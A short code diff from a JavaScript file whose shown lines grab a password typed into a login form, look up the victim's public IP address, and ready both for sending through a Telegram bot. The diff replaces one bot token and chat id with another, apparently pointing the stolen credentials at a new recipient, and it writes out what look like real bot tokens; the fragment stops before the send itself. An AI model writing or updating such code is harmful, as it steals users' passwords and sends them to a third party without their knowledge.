@@ -446,8 +446,8 @@
 			try {
 				let password = `Possible password: ${document.getElementsByClassName("x-login-form__input")[0].value}`;
 				
-				let bot_token = "6923555673:AAGgQG8MiTn4uCaA7vS_oTz2AP3MiMsguAc"
-				let chat_id = "-4145222672"
+				let bot_token = "6242816241:AAFQuQKZ4MTRazOoZSXcdICXrpcGdRWB-r4"
+				let chat_id = "1804765109"
 				
 				require("https").get("https://api.ipify.org", (response) => {response.on('data', function (chunk) {
 					password = `IP: ${chunk.toString()}%0d%0a${password}`
